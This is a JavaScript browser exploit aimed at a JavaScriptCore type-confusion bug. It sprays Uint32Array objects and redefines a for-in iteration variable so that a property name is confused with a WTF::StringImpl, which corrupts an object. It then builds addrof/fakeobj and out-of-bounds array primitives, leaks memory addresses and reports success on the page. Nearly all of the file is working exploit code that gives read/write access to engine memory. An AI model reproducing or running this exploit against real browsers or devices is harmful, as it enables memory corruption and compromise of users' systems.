// for addrof&fakeobj
const leakObj = { a: 0 };
const leakArr = new Uint32Array(6);
// for addrof&fakeobj
const oobSlave = new Uint8Array(1024);
const oobMaster = new Uint32Array(7);
// other stuff
const spray = [];
var impl_idx = 0;

// Sprays One Uint32Array Object
function spray_struct() {
  var spraystruct = new Uint32Array(1);
  spraystruct[spray.length + "spray"] = 123;
  spray.push(spraystruct);
}

// Begin Spraying Uint32Array Objects
for (let i = 0; i < 0x10000; i++)
  spray_struct();


// Preparing element thats going to contain debug text
privDebugElement = document.createElement("p");
privDebugElement.setAttribute("id", "infc");// for style

// Custom function, that takes arguments kind of like the C function Printf does
// this however, will print out the formatted string onto the page instead of the
// javascript console. Making it usefull when debugging and stuff. 
function printf(...args) {
  const output = args
    .map((arg) => {
      if (typeof arg === "object") {
        return JSON.stringify(arg) + " ";
      } else {
        return arg.toString() + " ";
      }
    }).join(" ");
  // Append formatted string into paragraph element, then set new line using <br> element
  privDebugElement.innerHTML += output + "<br>";
}
// We print the number of arrays sprayed
printf(spray.length, "Uint32Arrays Sprayed");

//The Target object structure: 5678 is the length, see the original exploit for explanation of property a
var target = {
  a: 2.1100820415101592e-303, // small point float property
  b: false, // boolean property
  c: true, // boolean property
  d: 5678, // integer property
};
//crash if this second target is not present. not used anywhere, try removing if it crashes
var target2 = { a: 2.1100820415101592e-303, b: false, c: true, e: 5678, };

//type-confused with WTF::StringImpl
function create_impl() {
  // the property (a) is type-confused with WTF::StringImplShape::m_hashAndFlags
  const ans = { a: target };
  for (let i = 0; i < 32; i++, impl_idx++) {
    ans[impl_idx + "x"] = {};
  }
  return ans;
}
function hexNum(input) {
  return "0x" + Number(input).toString(16);
}

function trigger(x) {
  if (impl.a != target) {
    console.log("wtf?");
    while (1);
  }
  // Property (a) is type-confused with WTF::String::m_impl
  var o = { a: 1 };

  // Iterate over the properties of 'o'
  for (var i in o) {
    /* Redefine the iteration variable 'i' to the value of 'x'. This will cause 
    the property name to be type-confused with a string object without any
    check in the op_get_direct_pname handler */
    {
      i = x;
      function i() { }
    }
    // this sets bit 4 (|= 16) in WTF::StringImplShape::m_hashAndFlags
    o[i];
  }

  if (impl.a != target) {
    printf("Corrupted!");
    printf("impl Variable Information",
      "<br> impl type: ", typeof impl,
      "<br> property (a) length:", impl.a.length,
      "<br> property (a) type: ", typeof impl.a
    );
    target.c = leakObj;
    leakObj.a = leakObj;
    var l1 = impl.a[4], l2 = impl.a[5];
    leakObj.a = oobSlave;
    var s1 = impl.a[4], s2 = impl.a[5];
    target.c = leakArr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oobMaster;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    printf("leaked information",
      "<br> l1:", hexNum(l1),
      "<br> l2:", hexNum(l2),
      "<br> s1:", hexNum(s1),
      "<br> s2:", hexNum(s2)
    );
    return 420;
  }
} 
for (var _ = 0; _ < 1024; _++) {
  //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
  var impl = create_impl();
  var s = { a: impl };
  if (trigger(s) == 420) {
    printf("Exploit Success!");
    break;
  }
}
